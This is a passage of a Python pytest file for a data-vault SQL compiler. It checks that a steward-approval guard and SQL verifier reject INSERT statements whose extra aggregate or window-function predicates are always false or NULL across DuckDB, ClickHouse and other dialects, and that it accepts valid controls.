                fn, sat_sql, diags,
            )
        lnk_scalar_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) "
            f"SELECT {fn}OrNull({args_val}) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'"
        )
        lnk_diags = verifier.verify_sql(
            lnk_scalar_sql, "clickhouse", extra_unstructured_links=["lnk_u"],
        )
        assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in lnk_diags), (
            fn, lnk_scalar_sql, lnk_diags,
        )

    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred,
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls = (
        ("duckdb_local", "NULLIF(1, (SELECT 1 AS x QUALIFY ROW_NUMBER() OVER () = 1 AND s.id = 99)) = ANY(ARRAY[1])"),
        ("databricks_uc", "NULLIF(1, (SELECT 1 AS x QUALIFY ROW_NUMBER() OVER () = 1 AND s.id = 99)) = 1"),
        ("databricks_uc", "NULLIF(1, (SELECT 1 AS x WHERE s.id = 99 SORT BY s.id LIMIT 1)) = 1"),
        ("databricks_uc", "NULLIF(1, (WITH c AS (SELECT 1 AS x SORT BY x LIMIT 1) SELECT x FROM c WHERE s.id = 99)) = 1"),
        ("clickhouse", "avgWeighted(1, 1) OVER () = 1"),
        ("clickhouse", "topKWeighted(3)(1, 1) OVER () = [1]"),
        ("clickhouse", "sumSimpleState(1) OVER () = 1"),
        ("clickhouse", "nth_valueIf(1, 1, 1 = 1) OVER () = 1"),
        ("clickhouse", "lagInFrame(1, 0) OVER () = 1"),
        ("clickhouse", "leadInFrame(1, 0) OVER () = 1"),
        ("clickhouse", "lagInFrame(1, 1, 99) OVER () = 1"),
        ("clickhouse", "leadInFrame(1, 1, 99) OVER () = 1"),
        ("clickhouse", "lagInFrameIf(1, 0, 1 = 1) OVER () = 1"),
        ("clickhouse", "lagInFrameIf(1, 1, 99, 1 = 1) OVER () = 1"),
        ("clickhouse", "leadInFrameIf(1, 1, 99, 1 = 1) OVER () = 1"),
    )
    for ok_tid, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)


def test_iter46_r13_lag_offset_if_conds_and_passthrough_aggs() -> None:
    """Remediate r13 3-arg LAG NULL offset, stripped -If conds, and CombinedAggFunc/AnonymousAggFunc passthrough."""
    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    dialect_blocked: list[tuple[str, str]] = [
        # Item 1: 3-arg LAG/LEAD/LAGINFRAME/LEADINFRAME NULL offset
        ("duckdb_local", "LAG(1, NULL, 99) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", "LEAD(1, NULL, 99) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrame(1, NULL, 99) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrame(1, NULL, 99) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameIf(1, NULL, 99, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        # Item 2: Stripped -If conditions (NULL or False)
        ("clickhouse", "nth_valueIf(1, 1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "nth_valueIf(1, 1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameIf(1, 0, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameIf(1, 0, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameIf(1, 1, 99, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        # Item 3: ab=True value-passthrough on CombinedAggFunc / AnonymousAggFunc
        ("clickhouse", "COALESCE(first_valueIf(1 = 1, 1 = 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "first_valueIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "last_valueIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyLastIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "minIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "maxIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyHeavyIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anySimpleState(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "minSimpleState(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyLast(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    ]
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls = (
        ("duckdb_local", "LAG(1, 1, 99) OVER () = 99"),
        ("clickhouse", "lagInFrameOrDefault(1, 1, 99) OVER () = 99"),
        ("clickhouse", "nth_valueIf(1, 1, 1 = 1) OVER () = 1"),
        ("clickhouse", "lagInFrameIf(1, 0, 1 = 1) OVER () = 1"),
        ("clickhouse", "lagInFrameIf(1, 1, 99, 1 = 1) OVER () = 99"),
        ("clickhouse", "first_valueIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", "COALESCE(first_valueIf(1, NULL) OVER (), 1) = 1"),
    )
    for ok_tid, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter47_r15_arg_by_passthrough_bool_combinators_and_nullable_if() -> None:
    """Remediate r15 ARG_MAX/MAX_BY/MODE/SINGLE_VALUE passthrough, ClickHouse bool combinators, and nullable -If false conditions."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED')")
    for live_e in ("ARG_MAX(1 = 1, 1)", "MAX_BY(1 = 1, 1)", "MODE(1 = 1)"):
        val = ddb.execute(f"SELECT {live_e} FROM staging.s AS s").fetchone()[0]
        assert isinstance(val, bool) and val is True, live_e
    for live_null in ("ARG_MAX(1, NULL)", "MAX_BY(1, NULL)"):
        assert ddb.execute(f"SELECT {live_null} FROM staging.s AS s").fetchone()[0] is None, live_null
    ddb.close()

    item1_preds = (
        "ARG_MAX(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARG_MIN(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "MAX_BY(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "MIN_BY(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARGMAX(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARGMIN(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARG_MAX_NULL(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARG_MAX_NULLS_LAST(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARG_MIN_NULL(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "ARG_MIN_NULLS_LAST(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "MODE(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "MODE() WITHIN GROUP (ORDER BY 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "SINGLE_VALUE(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "SINGLEVALUE(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(ARG_MAX(1 = 1, 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(MAX_BY(1 = 1, 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(MODE(1 = 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(SINGLE_VALUE(1 = 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT ARG_MAX(1 = 1, 1)) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT MODE(1 = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "arg_max(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "max_by(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "arg_min(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "min_by(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
    )
    dialect_blocked: list[tuple[str, str]] = [
        (tid, pred) for tid in SQL_TARGET_IDS for pred in item1_preds
    ]
    dialect_blocked.extend([
        # Item 2: ClickHouse combinators on BOOL_FUNC_NAMES
        ("clickhouse", "boolAndIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolOrIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_andIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_orIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "everyIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "logical_andIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "logical_orIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolAnd_aggIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolOr_aggIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolXor_aggIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolAndSimpleState(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolOrSimpleState(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolAndOrDefault(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolOrOrDefault(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolAndIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolOrIf(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolAndOrNull(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        # Item 3: ClickHouse -If false/NULL conditions & passthrough combinators
        ("clickhouse", "argMaxIf(1 = 1, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "argMinIf(1 = 1, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "argMaxSimpleState(1 = 1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "singleValueIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "avgIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevPopIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varPopIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileIf(0.5)(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactIf(0.5)(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "medianIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "argMaxIf(1, 1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "argMinIf(1, 1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "singleValueIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    ])

    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred,
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls = (
        ("duckdb_local", "ARG_MAX(1, 1) OVER () = 1"),
        ("duckdb_local", "ARG_MIN(1, 1) OVER () = 1"),
        ("duckdb_local", "MAX_BY(1, 1) OVER () = 1"),
        ("duckdb_local", "MIN_BY(1, 1) OVER () = 1"),
        ("duckdb_local", "MODE(1) OVER () = 1"),
        ("duckdb_local", "SINGLE_VALUE(1) OVER () = 1"),
        ("postgres", "MAX_BY(1, 1) OVER () = 1"),
        ("postgres", "STRING_AGG('a', ',') WITHIN GROUP (ORDER BY 1 = 1) OVER () = 'x'"),
        ("clickhouse", "sumIf(1, 1 = 0) OVER () = 0"),
        ("clickhouse", "countIf(1, 1 = 0) OVER () = 0"),
        ("clickhouse", "avgIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", "quantileIf(0.5)(1, 1 = 1) OVER () = 1"),
        ("clickhouse", "medianIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", "argMaxIf(1, 1, 1 = 1) OVER () = 1"),
        ("clickhouse", "argMinIf(1, 1, 1 = 1) OVER () = 1"),
        ("clickhouse", "COALESCE(avgIf(1, 1 = 0) OVER (), 1) = 1"),
        ("clickhouse", "COALESCE(argMax(1, NULL) OVER (), 1) = 1"),
        ("clickhouse", "boolAndIf(1, 1 = 1) OVER () = 1"),
    )
    for ok_tid, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter48_r16_quantile_disc_ch_if_nontrue_and_bool_combinators() -> None:
    """Remediate r16 PERCENTILE_DISC/QUANTILE_DISC passthrough, ClickHouse -If non-true/OrDefault, and BOOL_FUNC_NAMES combinators."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE SCHEMA raw_vault")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("CREATE TABLE raw_vault.lnk_u (hk_u VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'UNAPPROVED')")
    for live_b in (
        "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1 = 1)",
        "QUANTILE_DISC(1 = 1, 0.5)",
    ):
        val = ddb.execute(f"SELECT {live_b} FROM staging.s AS s").fetchone()[0]
        assert isinstance(val, bool) and val is True, live_b
    for live_i in (
        "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1)",
        "QUANTILE_DISC(1, 0.5)",
    ):
        assert ddb.execute(f"SELECT {live_i} FROM staging.s AS s").fetchone()[0] == 1, live_i
    for bypass_pred in (
        "(SELECT PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1 = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT QUANTILE_DISC(1 = 1, 0.5)) = ALL(SELECT 1 WHERE FALSE)",
    ):
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND {bypass_pred}"
        ).fetchone()[0] == 0
    ddb.close()

    item1_preds = (
        "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1 = 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
        "QUANTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1 = 1) = ALL(SELECT 1 WHERE FALSE)",
        "QUANTILE_DISC(1 = 1, 0.5) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(QUANTILE_DISC(1 = 1, 0.5) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
        "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
        "QUANTILE_DISC(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
    )
    dialect_blocked: list[tuple[str, str]] = [
        (tid, pred) for tid in SQL_TARGET_IDS for pred in item1_preds
    ]
    dialect_blocked.extend([
        # Item 2: ClickHouse -If non-true conditions (0, runtime, NOT 1) & -OrDefault boolean passthrough
        ("clickhouse", "avgIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "avgIf(1, s.id = 999) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "avgIf(1, NOT 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileIf(0.5)(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "argMaxIf(1, 1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "argMinIf(1, 1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "singleValueIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevPopIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varPopIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "medianIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "minIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "maxIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyOrDefault(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        # Item 3: ClickHouse BOOL_FUNC_NAMES combinators & BOOL_*_AGG underscore variants
        ("clickhouse", "boolXorIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolXorIf(1, 1 = 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolXorIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolNotIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "boolNotIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_and_aggIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_or_aggIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_xor_aggIf(1 = 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_and_aggIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_or_agg(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "bool_xor_agg(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    ])

    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred,
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls: list[tuple[str, str]] = [
        (tid, ok_pred)
        for tid in SQL_TARGET_IDS
        for ok_pred in (
            "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY 1) OVER () = 1",
            "QUANTILE_DISC(1, 0.5) OVER () = 1",
        )
    ]
    valid_controls.extend([
        ("clickhouse", "avgIf(1, 1) OVER () = 1"),
        ("clickhouse", "avgIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", "sumIf(1, 0) OVER () = 0"),
        ("clickhouse", "countIf(1, 0) OVER () = 0"),
        ("clickhouse", "COALESCE(avgIf(1, 1 = 0) OVER (), 1) = 1"),
        ("clickhouse", "COALESCE(avgIf(1, 0) OVER (), 1) = 1"),
        ("clickhouse", "avgOrDefaultIf(1, 1 = 0) OVER () = 0"),
        ("clickhouse", "avgOrDefault(1) OVER () = 1"),
        ("clickhouse", "anyOrDefaultIf(1, 1 = 0) OVER () = 0"),
        ("clickhouse", "boolXorIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", "bool_and_aggIf(1, 1 = 1) OVER () = 1"),
    ])
    for ok_tid, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
